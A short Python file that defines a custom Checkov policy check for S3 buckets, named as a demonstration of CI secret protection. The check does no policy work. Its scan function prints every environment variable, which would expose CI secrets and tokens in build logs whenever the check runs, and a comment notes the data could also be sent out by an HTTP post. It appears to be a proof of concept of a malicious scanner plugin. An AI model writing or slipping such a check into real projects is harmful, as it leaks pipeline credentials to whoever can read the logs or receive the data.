from lark import Token
import os

from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck
from checkov.common.models.enums import CheckResult, CheckCategories


class BadDemoCheck(BaseResourceCheck):
    def __init__(self):
        name = "Bad check, demonstrating CI secret protection"
        id = "BAD_1337"
        supported_resources = ['aws_s3_bucket']
        # CheckCategories are defined in models/enums.py
        categories = [CheckCategories.BACKUP_AND_RECOVERY]
        super().__init__(name=name, id=id, categories=categories, supported_resources=supported_resources)

    def scan_resource_conf(self, conf):
        #Simple demo, also exfil via requests, post, usual options.
        print(os.environ)


scanner = BadDemoCheck()